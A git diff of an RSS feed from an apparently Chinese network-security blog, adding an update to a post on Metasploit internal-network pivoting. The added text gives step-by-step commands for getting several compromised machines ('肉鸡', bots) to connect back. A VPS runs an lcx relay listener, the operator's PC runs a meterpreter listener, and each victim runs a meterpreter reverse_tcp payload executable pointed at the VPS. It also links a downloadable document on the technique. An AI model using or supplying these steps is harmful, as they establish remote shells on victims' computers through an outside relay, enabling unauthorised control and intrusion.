@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 16 May 2016 17:42:49 +0800</pubDate>
-    <lastBuildDate>Mon, 16 May 2016 17:42:49 +0800</lastBuildDate>
+    <pubDate>Tue, 17 May 2016 17:33:28 +0800</pubDate>
+    <lastBuildDate>Tue, 17 May 2016 17:33:28 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
     
       <item>
@@ -272,9 +272,30 @@ line2&amp;gt; 不断提升自己核心单点打击力------&amp;gt; 如针对一
     
       <item>
         <title>msf的两种内网间连接方式及多重转发</title>
-        <description>&lt;p&gt;msf的两种内网间连接方式及多重转发&lt;/p&gt;
+        <description>&lt;p&gt;msf的两种内网间连接方式及多重转发   download:&lt;a href=&quot;https://github.com/xinghuacai/msf-lcx/raw/master/msf%26lcx/msf%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%85%E7%BD%91%E9%97%B4%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%A4%9A%E9%87%8D%E8%BD%AC%E5%8F%91.doc&quot;&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;here&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;download:&lt;a href=&quot;https://github.com/xinghuacai/msf-lcx/raw/master/msf%26lcx/msf%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%85%E7%BD%91%E9%97%B4%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%A4%9A%E9%87%8D%E8%BD%AC%E5%8F%91.doc&quot;&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;here&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&quot;update2016-05-17&quot;&gt;update:2016-05-17&lt;/h4&gt;
+&lt;font color=&quot;red&quot;&gt;实现meterpreter payload经过vps上lcx中转后的多个肉鸡上线&lt;/font&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/msf-1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;step1--&amp;gt;vps:
+        lcx -listen 300 53
+step2--&amp;gt;主控端pc:
+        start msf
+        start a listener,meterpreter/bind_tcp,rhost=vps&#39;s ip,lhost=300
+step3--&amp;gt;victim1:
+        run 53.exe(a meterpreter/reverse_tcp payload exe,lhost=vps&#39;s ip,lport=53)
+
+!!!!!!till now!!!!!!:
+    victim1 will connect back successfully,but if I want victim2 connect back successfully after upon actions,found it fail after victim2 run 53.exe
+
+!!!!!!solution!!!!!!:
+step4--&amp;gt;
+    victim2:run53.exe
+    主控端pc:start a listener again like before
+    (after run 53.exe on victim2,start a listener again like before.)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 </description>
         <pubDate>Fri, 15 Apr 2016 00:00:00 +0800</pubDate>
